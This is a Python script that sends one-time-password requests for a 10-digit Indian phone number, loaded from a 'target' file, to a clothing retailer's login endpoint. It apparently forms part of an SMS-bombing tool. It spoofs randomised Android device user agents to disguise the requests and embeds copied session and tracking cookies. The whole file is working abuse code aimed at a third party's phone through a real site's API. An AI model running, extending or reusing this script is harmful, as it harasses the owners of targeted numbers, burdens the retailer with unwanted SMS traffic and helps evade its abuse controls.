import json
import random
from typing import Any
import requests

OTP_API_URL = "https://www.westside.com/account/login.data"

def get_random_device() -> dict[str, str]:
    devices = [
        {"model": "Infinix X6871", "android": "15", "chrome": "155"},
        {"model": "Samsung Galaxy S24", "android": "15", "chrome": "155"},
        {"model": "Redmi Note 13 Pro", "android": "14", "chrome": "154"},
        {"model": "POCO X6 Pro", "android": "14", "chrome": "155"},
        {"model": "Realme GT 6", "android": "15", "chrome": "154"},
        {"model": "Vivo V30", "android": "14", "chrome": "153"},
        {"model": "OnePlus Nord 4", "android": "15", "chrome": "155"},
        {"model": "Motorola Edge 50", "android": "14", "chrome": "154"},
        {"model": "iQOO Z9", "android": "14", "chrome": "155"},
        {"model": "Nothing Phone 2a", "android": "15", "chrome": "155"},
    ]

    d = random.choice(devices)
    build = f"AP3A.{240000 + random.randint(0, 8999)}.015.A2"
    chrome_full = f"{d['chrome']}.0.{random.randint(1000, 9999)}.{random.randint(10, 99)}"

    ua = (
        f"Mozilla/5.0 (Linux; Android {d['android']}; {d['model']} Build/{build}) "
        f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{chrome_full} "
        f"Mobile Safari/537.36"
    )

    sec_ch_ua = (
        f'"Android WebView";v="{d["chrome"]}", '
        f'"Chromium";v="{d["chrome"]}", '
        f'"Not(A:Brand";v="24"'
    )

    return {
        "userAgent": ua,
        "secChUa": sec_ch_ua,
        "platform": '"Android"',
        "mobile": "?1",
    }

def main() -> dict[str, Any]:
    # ===== Load number from target.py =====
    try:
        from target import NUMBER
        number = str(NUMBER).strip()
    except Exception as e:
        return {"success": False, "message": f"Failed to load NUMBER from target.py → {e}"}

    if not (number.isdigit() and len(number) == 10):
        return {"success": False, "message": f"Invalid number in target.py: {number}"}

    device = get_random_device()

    try:
        payload = {
            'countryCode': "91",
            'phone': number,
            'action': "get-verify-otp"
        }

        headers = {
            'User-Agent': device["userAgent"],
            'Accept-Encoding': "gzip, deflate, br, zstd",
            'sec-ch-ua-platform': device["platform"],
            'sec-ch-ua': device["secChUa"],
            'sec-ch-ua-mobile': device["mobile"],
            'origin': "https://www.westside.com",
            'x-requested-with': "mark.via.gp",
            'sec-fetch-site': "same-origin",
            'sec-fetch-mode': "cors",
            'sec-fetch-dest': "empty",
            'referer': "https://www.westside.com/account/login",
            'accept-language': "en-US,en;q=0.9",
            'priority': "u=1, i",
            'Cookie': "session=eyJjdXN0b21lckdlbmRlciI6IndvbWVuIn0%3D.%2BaTLUPMpclFIZ8YIaqjkAtHIW5q5jry9ymtS%2FI2aYVM; _shopify_essential=:AaGFiGjlAAEAGhuYiIXcowQNcCQrPcqFnon0BppcRa5DjbtOMEyYXz_bUFvRDJX9lvvy5IKLeQMxzl-FEruOeroCaHs:; _shopify_analytics=:AaGFiGjoAAEAsOcexCTlWfRD3jFBLfcJA1xjHyOIXZa-cTpZF2bmVIWzFxcGD9OQobpgLKp8EIi-MJ0rK9BTv4exRkY:; _shopify_marketing=:AaGFiGjoAAEAvsG3Vsrf2vjX2Oi0HgZK0AYAT9k1aMkz9qhi3Tm32lgMBMEUiC5mA9m3mLSReSS1_uDVGMdW83fhcpU:; _fbp=fb.1.1793241673724.842052922685907419; _shopify_y=dd0c9d62-9e76-487e-9a50-6d9c964f29ec; _shopify_s=e1bb7913-5ef1-46b7-94cb-b7b5dc6c4ef7"
        }

        resp = requests.post(
            OTP_API_URL,
            headers=headers,
            data=payload,
            timeout=15,
        )

        try:
            result_data = resp.json()
        except json.JSONDecodeError:
            result_data = {"raw": resp.text}

        if resp.ok:
            return {
                "success": True,
                "message": f"OTP request sent to {number}",
                "status_code": resp.status_code,
                "data": result_data,
            }
        else:
            return {
                "success": False,
                "message": f"HTTP {resp.status_code}",
                "data": result_data,
            }

    except Exception as err:
        return {"success": False, "message": str(err)}

if __name__ == "__main__":
    result = main()
    print(json.dumps(result, indent=2, ensure_ascii=False))
